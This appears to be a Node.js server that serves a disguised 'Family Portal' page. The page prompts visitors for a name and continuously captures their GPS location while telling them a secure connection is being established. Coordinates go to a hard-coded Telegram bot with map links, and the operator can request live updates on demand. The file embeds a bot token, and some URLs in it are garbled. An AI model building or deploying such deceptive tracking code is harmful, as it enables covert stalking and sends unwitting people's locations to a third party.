const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

// --- TRACKING LOGIC FLAGS ---
let singleUpdateRequested = false;
let knownDevices = {};

// HTML layout served to the phone
const htmlPage = `
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f6f9; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Connecting to Family Portal</h2>
    <div class="loader"></div>
    <p id="msg">Locating device... Please stay on this page.</p>

    <script>
        let deviceOwner = prompt("Please enter your name:") || "Unknown Device";

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((position) => {
                const data = {
                    name: deviceOwner,
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                };
                
                fetch('/update', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                document.getElementById('msg').innerText = "Secure connection established, " + deviceOwner + "! Keep this tab open.";
            }, (err) => {
                document.getElementById('msg').innerText = "Error: Please allow location access.";
            }, { enableHighAccuracy: true });
        } else {
            document.getElementById('msg').innerText = "Device not supported.";
        }
    </script>
</body>
</html>
`;

function sendTelegramMessage(text) {
    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "Markdown"
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    const req = https.request(options, () => {});
    req.on('error', (err) => console.error("Telegram Outbound Error:", err));
    req.write(data);
    req.end();
}

let lastUpdateId = 0;
function pollTelegramUpdates() {
    https.get(`https://telegram.org{TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
            try {
                const response = JSON.parse(data);
                if (response.ok && response.result.length > 0) {
                    for (let update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message && String(update.message.chat.id) === TELEGRAM_CHAT_ID) {
                            const text = update.message.text ? update.message.text.trim() : "";
                            if (text === "/update") {
                                singleUpdateRequested = true;
                                sendTelegramMessage("🔄 *Request acknowledged.* Waiting for the next live phone transmission update...");
                            }
                        }
                    }
                }
            } catch (e) {}
            pollTelegramUpdates();
        });
    }).on('error', (err) => {
        setTimeout(pollTelegramUpdates, 5000);
    });
}

// Create base HTTP server interface
const server = http.createServer((req, res) => {
    if (req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(htmlPage);
    } else if (req.method === 'POST' && req.url === '/update') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const coords = JSON.parse(body);
                const time = new Date().toLocaleTimeString();
                const mapsLink = `https://google.com{coords.lat},${coords.lon}`;
                
                let shouldSendAlert = false;

                if (!knownDevices[coords.name]) {
                    knownDevices[coords.name] = true;
                    shouldSendAlert = true;
                } else if (singleUpdateRequested) {
                    singleUpdateRequested = false; 
                    shouldSendAlert = true;
                }

                if (shouldSendAlert) {
                    const msg = `🚨 *Location Update Alert!*\n👤 *Device:* ${coords.name}\n⏰ *Time:* ${time}\n📍 *Coords:* ${coords.lat}, ${coords.lon}\n\n🗺️ [View on Google Maps](${mapsLink})`;
                    sendTelegramMessage(msg);
                }
            } catch (e) { console.error("Data parse error:", e); }

            res.writeHead(200);
            res.end();
        });
    }
});

// Binding strictly to host 0.0.0.0 is required for Render cloud routing
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Cloud Server active on port ${PORT}`);
    pollTelegramUpdates();
});
